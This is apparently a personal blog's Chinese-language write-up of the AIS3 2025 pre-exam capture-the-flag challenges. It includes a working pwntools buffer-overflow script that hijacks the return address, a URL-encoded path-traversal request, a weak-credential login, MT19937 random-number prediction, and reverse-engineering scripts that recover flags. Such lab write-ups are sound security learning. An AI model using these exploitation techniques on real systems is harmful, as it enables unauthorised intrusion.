---
title: 2025 AIS3 Pre-Exam Writeup
slug: ais3-2025-writeup
date: '2025-07-25T00:00:00.000Z'
showDateUpdated: false
draft: false
description: AIS3 2025 pre-exam challenge writeup.
tags:
  - ctf
  - writeups
categories:
  - Security
authors:
  - haoching
aliases:
  - /posts/1753445505053-ais32025write-up/
  - /posts/1753445505053-example/
featureimage: >-
  https://media.chang929.site/posts/ais3-2025-writeup/ec4a7a23dddc94bccbda2b92d4f08e5db478e04b4e4bc2758fc0009e599ecc0c.png
lastmod: '2026-08-30T21:37:38.466Z'
---
# 2025 ais3 pre-exam write-up

result:
![alt text](https://media.chang929.site/posts/ais3-2025-writeup/4c53906a61eb099deca4b415323caceaa4a4fa7685df6abbb059fa6c87f1e871.png)
這次解的題目最後全變 100 分 QAQ

題目都忘記截圖只能看解法猜題目 ╯︿╰ 

## login screen 1

於 login page 嘗試弱密碼 admin/admin 成功登入
觀察 dockr-compose.yml
![image](https://media.chang929.site/posts/ais3-2025-writeup/12ccfc7e09790cccdc0c13b2f80d7bdf4d486d7f1fd002e7e038e13e0d9b7d46.png)
發現 db 可以訪問
下載 db 找到 2fa code
![image](https://media.chang929.site/posts/ais3-2025-writeup/f52f9bc5e87eb587a8eef98f93e49a45c4ae31fd5cf5558067a96993f75d514a.png)
成功登入取得 flag

## tomorin db

直接進入 /flag 會被 redirect

將`/` URL encode 成功 bypass，進入
`chals1.ais3.org:30000/..%2fflag`
取得 flag

## Welcome to the World of Ave Mujica

- 動態分析發現可以 burrfer overflow
- 丟進 ida 發現 0x401256 有一個 shell

![image](https://media.chang929.site/posts/ais3-2025-writeup/f4045a652ac6add6943d1de26fa647d9ffcc9e22df4eb966c809f5d4527ed40b.png)

- 使用 cyclic 計算 offset
將 return address 覆蓋為 0x4012D6 取得 shell

``` python
import pwn

host = "chals1.ais3.org"
port = 60122
conn = pwn.remote(host, port)
# conn = pwn.gdb.debug("./chal", env={"LD_PRELOAD": "./libc.so.6"})

conn.recvuntil(b'?')
conn.sendline(b'yes')
conn.recvuntil(b': ')
conn.sendline(b'-1')
conn.recvuntil(b': ')

g = pwn.cyclic_gen()
conn.sendline(g.get(168) + pwn.p64(0x4012D6))
```

## Raman CTF

掃描發票上 qrcode 將發票號碼填入發票 app 取得發票資訊，再使用 google map 搜尋地址取得 flag

![image](https://media.chang929.site/posts/ais3-2025-writeup/f91f67f3859c3fbbc0a45cb05985c0d9bae019138697921b81be0977a66b2ff8.png)


## AIS3 Tiny Server - Web / Misc

題目提到 root directory 嘗試進入 chals1.ais3.org:20616//
成功 LFI 訪問根目錄取得 flag
![image](https://media.chang929.site/posts/ais3-2025-writeup/715503f5e384bc12a2ec5211ede40fc34d018f98fda6d1c5eb3100053bb2789f.png)
取得flag

## Welcome

沒辦法直接複製，直接打，懶得找其他方法。
![image](https://media.chang929.site/posts/ais3-2025-writeup/28404ee5bbc40c70ebb779a2af8eed5c671d5e1fe72fcf70970523a5e87489d2.png)

## Stream

可以暴力遍歷 a 檢查 b 是否為完全平方數得到每輪使用的隨機數，因為 getrandbits() 使用 mt19937 ，只要取得 634*32bits 的已知隨機數可以預測後續生成之隨機數。

```python
from random import getrandbits
from hashlib import sha512
import gmpy2
from pyrandcracker import RandCracker


def rev(a: bytes, b: int):
    return int.from_bytes(a) ^ b


craker = RandCracker()

randbyte = []

for i in l:
    for j in range(256):
        r = rev(sha512(j.to_bytes()).digest(), i)
        if gmpy2.is_square(r):
            craker.submit(gmpy2.isqrt(r), 256)
craker.check()
        
print((l[80]^craker.rnd.getrandbits(256)**2).to_bytes(32, 'big'))
```
執行腳本取得 flag
![image](https://media.chang929.site/posts/ais3-2025-writeup/06306a15579caba2d88e9aca0e0967b188776c5570544521ca0c1f9df50f66c5.png)

## AIS3 Tiny Server - Reverse

丟進 IDA 可以看到 `sub_1E20()` 這個 function 會檢查 flag

![image](https://media.chang929.site/posts/ais3-2025-writeup/b52c05f46c667a0d7c5d2625498450cb63a6619d483341a10bd41829a6ac0883.png)
![image](https://media.chang929.site/posts/ais3-2025-writeup/2e3b191649d75c1b470444770f255d5cd12b3579c3a0401e53d26e16707a96a6.png)

撰寫腳本還原 flag
```python

import struct

def extract_flag():
    encrypted_data = [
        1480073267, 
        1197221906, 
        254628393,  
        920154,     
        1343445007, 
        874076697,  
        1127428440, 
        1510228243, 
        743978009,  
        54940467,   
        1246382110  
    ]
    

    encrypted_bytes = []
    for num in encrypted_data:
        bytes_from_int = struct.pack('<I', num)
        encrypted_bytes.extend(bytes_from_int)
    
    # The XOR key from v7
    key = b"rikki_l0v3"
    

    
    encrypted_bytes.append(20) 
    
    decrypted = bytearray(45)  
    
    v2 = 51 
    v3 = 114
    
    for i in range(45):
        decrypted[i] = v2 ^ v3
        
        if i + 1 < 45:
            v2 = encrypted_bytes[i + 1]
            v3 = key[(i + 1) % len(key)] 

    flag = decrypted.decode('ascii', errors='ignore').rstrip('\x00')
    return flag

if __name__ == "__main__":
    flag = extract_flag()
    print(f"flag: {flag}")
```
取得flag
![image](https://media.chang929.site/posts/ais3-2025-writeup/3982a94aadfa19de4b881b9c5634148a86ce571c283d17168ca9323cfd47b51e.png)

## A simple snake game

丟 IDA 逆向找到有一個檢查分數和關卡的地方
![image](https://media.chang929.site/posts/ais3-2025-writeup/f1c18d5b4dbc24fea4abcac8d61fb6e4ad4b3bda185602d0c4965e5a834783a8.png)
patch 成 jg 跳過檢查
![image](https://media.chang929.site/posts/ais3-2025-writeup/ca76332981669d4565e60e542d4ebded6ecfef281602a97758a17ad4b0814b1e.png)
進入遊戲取得 flag
![image](https://media.chang929.site/posts/ais3-2025-writeup/90c85b72374c7fbf0aa80e55740ce77bdaaeaad664afc98f18d6af8fac787559.png)

## web flag checker

從 source 可以看到 wasm
有一個函式叫 flag checker
![image](https://media.chang929.site/posts/ais3-2025-writeup/3bd0a49b92ac9ff74205212fcc0beb02013ddeeaadd3d72403ea47b8f14523d3.png)
丟給 claude 幫忙 reverse 並撰寫腳本

```python
import struct

def ror64(value, shift):
    """64-bit right rotation (inverse of left rotation)"""
    value &= 0xFFFFFFFFFFFFFFFF
    shift &= 63
    return ((value >> shift) | (value << (64 - shift))) & 0xFFFFFFFFFFFFFFFF



def solve_flag_properly():
    expected_encrypted = [
        7577352992956835434,    # Chunk 0: "AIS3{W4S" with ROR 45
        7148661717033493303,    # Chunk 1: "M_R3v3rs" with ROR 28  
        (-7081446828746089091) & 0xFFFFFFFFFFFFFFFF,  # Chunk 2: needs brute force
        (-7479441386887439825) & 0xFFFFFFFFFFFFFFFF,  # Chunk 3: needs brute force
        8046961146294847270     # Chunk 4: "39229dd}" with ROR 61
    ]
    for i in range (5):
        print(f"\n--- Finding Chunk {i} ---")
        encrypted2 = expected_encrypted[i]
        best_chunk2_candidates = []

        for key in range(64):
            decrypted = ror64(encrypted2, key)
            try:
                bytes_data = struct.pack('<Q', decrypted)
                text = bytes_data.decode('ascii', errors='replace')
                printable_count = sum(1 for c in text if c.isprintable() and c != '�')

                if printable_count >= 6:
                    best_chunk2_candidates.append((key, bytes_data, text, printable_count))
            except:
                continue
        for key, data, text, score in best_chunk2_candidates[:10]:
            print(f"  Key {key:2d}: {text}")

    
  
if __name__ == "__main__":

    solve_flag_properly()
    

```

![image](https://media.chang929.site/posts/ais3-2025-writeup/b823317e8b1caa523b99d198f8f8d33caccc2dbef5d1cadfdb10aa971d14af60.png)

組合 flag 得到 `AIS3{W4SM_R3v3rsing_w17h_g0_4pp_39229dd}`

---

